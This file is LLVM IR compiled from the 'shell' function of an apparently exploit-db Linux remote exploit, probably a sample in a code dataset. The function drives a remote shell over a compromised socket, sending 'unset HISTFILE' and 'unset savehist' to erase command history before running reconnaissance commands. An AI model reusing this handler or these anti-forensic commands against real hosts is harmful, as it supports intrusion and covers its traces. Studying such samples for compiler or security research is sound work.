; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"ERROR: failed to connect\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"\0A[ CONNECTED ! ]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"unset HISTFILE\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"unset savehist\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"export TERM=xterm\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"export SHELL=sh\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"uname -a\0A\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"id\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"w\0A\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"select\00", align 1
@.str.10 = private unnamed_addr constant [46 x i8] c"[x] ewps! connection closed by foreign host.\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [8192 x i8], align 16
  %4 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %11

7:                                                ; preds = %1
  %8 = load i32, i32* @stderr, align 4
  %9 = call i32 (i32, i8*, ...) @fprintf(i32 %8, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 @exit(i32 1) #4
  unreachable

11:                                               ; preds = %1
  %12 = load i32, i32* @stdout, align 4
  %13 = call i32 @fflush(i32 %12)
  %14 = load i32, i32* @stderr, align 4
  %15 = call i32 (i32, i8*, ...) @fprintf(i32 %14, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %16 = bitcast [8192 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %16, i8 0, i64 8192, i1 false)
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @write(i32 %17, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 15)
  %19 = load i32, i32* %2, align 4
  %20 = call i32 @write(i32 %19, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 15)
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @write(i32 %21, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i32 18)
  %23 = load i32, i32* %2, align 4
  %24 = call i32 @write(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i32 16)
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @write(i32 %25, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i32 9)
  %27 = load i32, i32* %2, align 4
  %28 = call i32 @write(i32 %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 3)
  %29 = load i32, i32* %2, align 4
  %30 = call i32 @write(i32 %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i32 2)
  br label %31

31:                                               ; preds = %70, %11
  %32 = call i32 @FD_ZERO(i32* %4)
  %33 = call i32 @FD_SET(i32 0, i32* %4)
  %34 = load i32, i32* %2, align 4
  %35 = call i32 @FD_SET(i32 %34, i32* %4)
  %36 = call i32 @select(i32 255, i32* %4, i32 0, i32 0, i32 0)
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %41

38:                                               ; preds = %31
  %39 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %40 = call i32 @exit(i32 -1) #4
  unreachable

41:                                               ; preds = %31
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %43 = call i32 @memset(i8* %42, i32 0, i32 8192)
  %44 = load i32, i32* %2, align 4
  %45 = call i64 @FD_ISSET(i32 %44, i32* %4)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %59

47:                                               ; preds = %41
  %48 = load i32, i32* %2, align 4
  %49 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %50 = call i32 @recv(i32 %48, i8* %49, i32 8191, i32 0)
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %55

52:                                               ; preds = %47
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.10, i64 0, i64 0))
  ret void

55:                                               ; preds = %47
  %56 = load i32, i32* @stderr, align 4
  %57 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %58 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %57)
  br label %59

59:                                               ; preds = %55, %41
  %60 = call i64 @FD_ISSET(i32 0, i32* %4)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %70

62:                                               ; preds = %59
  %63 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %64 = call i32 @read(i32 0, i8* %63, i32 8191)
  %65 = load i32, i32* %2, align 4
  %66 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %67 = getelementptr inbounds [8192 x i8], [8192 x i8]* %3, i64 0, i64 0
  %68 = call i32 @strlen(i8* %67)
  %69 = call i32 @write(i32 %65, i8* %66, i32 %68)
  br label %70

70:                                               ; preds = %62, %59
  br label %31
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fflush(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
